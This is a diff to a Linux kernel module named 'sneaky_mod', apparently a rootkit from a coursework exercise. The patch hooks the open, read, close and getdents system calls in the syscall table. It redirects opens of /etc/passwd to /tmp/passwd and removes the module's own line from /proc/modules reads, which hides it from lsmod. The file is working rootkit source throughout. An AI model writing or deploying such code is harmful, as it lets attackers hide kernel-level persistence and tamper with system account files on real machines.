@@ -37,6 +37,7 @@ module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 char *processname = "sneaky_process";
 char *filename = "/tmp/passwd";
 char *modename = "sneaky_mod";
+static int module_pointer = -1;
 struct linux_dirent64 {
   u64 d_ino;               /* 64-bit inode number */
   s64 d_off;               /* 64-bit offset to next structure */
@@ -55,6 +56,7 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // should expect ti find its arguments on the stack (not in registers).
 // This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_close)(int fd);
 asmlinkage long (*orig_getdents)(unsigned int fd,
                                  struct linux_dirent64 __user *dirp,
                                  unsigned int count);
@@ -70,8 +72,21 @@ static int atoi(char *num) {
   return res;
 }
 asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
-  printk(KERN_INFO "read:%s", buf);
-  return orig_read(fd, buf, count);
+  // printk(KERN_INFO "read:%s", buf);
+  ssize_t rest;
+  char *ptr;
+  char *end;
+  rest = (*orig_read)(fd, buf, count);
+  if (module_pointer >= 0 && module_pointer == fd) {
+    ptr = strstr(buf, "sneaky_mod");
+    if (ptr != NULL) {
+      end = strchr(ptr, '\n');
+      memmove(ptr, end + 1, rest - (int)(end - buf));
+      rest -= (int)(end - ptr);
+    }
+  }
+  return rest;
+  //  return (*orig_read)(fd, buf, count);
 }
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                     struct linux_dirent64 __user *dirp,
@@ -103,10 +118,26 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
 }
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
+  int fd;
   if (strstr(pathname, "/etc/passwd") != NULL) {
+    char tmp_buf[sizeof("/etc/passwd")];
+    copy_from_user(tmp_buf, pathname, sizeof(tmp_buf));
     copy_to_user((void *)pathname, filename, sizeof(filename));
+    fd = original_call(pathname, flags);
+    copy_to_user((void *)pathname, tmp_buf, sizeof(tmp_buf));
+  } else if (strcmp(pathname, "/proc/modules") == 0) {
+    fd = original_call(pathname, flags);
+    module_pointer = fd;
+  } else {
+    fd = original_call(pathname, flags);
   }
-  return original_call(pathname, flags);
+  return fd;
+}
+
+asmlinkage int sneaky_sys_close(int fd) {
+  if (fd == module_pointer)
+    module_pointer = -1;
+  return original_close(fd);
 }
 
 // The code that gets executed when the module is loaded
@@ -128,9 +159,12 @@ static int initialize_sneaky_module(void) {
   original_call = (void *)*(sys_call_table + __NR_open);
   orig_getdents = (void *)*(sys_call_table + __NR_getdents);
   orig_read = (void *)*(sys_call_table + __NR_read);
+  original_close = (void *)*(sys_call_table + __NR_close);
+
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  //  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  *(sys_call_table + __NR_close) = (unsigned long)sneaky_sys_close;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
@@ -158,7 +192,7 @@ static void exit_sneaky_module(void) {
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_read) = (unsigned long)orig_read;
   *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;
-
+  *(sys_call_table + __NR_close) = (unsigned long)original_close;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
